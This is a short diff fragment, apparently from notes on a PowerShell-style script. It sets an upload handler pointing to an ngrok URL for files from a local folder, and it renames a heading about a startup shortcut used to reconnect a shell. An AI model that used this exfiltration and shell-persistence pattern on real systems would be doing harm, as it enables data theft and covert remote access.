@@ -83,7 +83,7 @@ $folder = 'F:\IAR401\';  $upload_handler='http://bc416b4d16e3.ngrok.io/upload_ha
 
 
 
-# Startup shortcut to reconnect shell
+# Startup shortcut to perform scripts
 
 ### Idea
 
